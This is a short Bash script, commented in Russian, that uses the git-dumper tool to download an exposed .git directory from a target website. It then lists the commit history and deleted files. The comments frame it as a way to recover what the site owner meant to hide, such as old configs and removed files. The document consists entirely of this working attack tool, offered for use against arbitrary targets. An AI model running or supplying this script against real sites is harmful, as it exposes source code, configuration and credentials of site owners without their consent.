#!/usr/bin/env bash
# git-dumper.sh — сливает .git с веба и вытаскивает то, что автор не хотел показывать:
# удалённые файлы, старые версии конфигов, историю коммитов.
# юзаж: ./git-dumper.sh http://target/.git/ ./dump
set -euo pipefail

URL="${1:?usage: git-dumper.sh URL_.git OUTDIR}"
OUT="${2:-./dump}"

command -v git-dumper >/dev/null || { echo "нет git-dumper: pip install git-dumper" >&2; exit 1; }

git-dumper "$URL" "$OUT"
cd "$OUT"

echo; echo "===== ИСТОРИЯ ====="
git log --oneline -20
echo; echo "===== УДАЛЁННОЕ (живёт в истории) ====="
git log -20 --diff-filter=D --name-only --format='-- %s'
echo; echo "дальше: git show <hash>:<файл> — содержимое из любой точки истории"
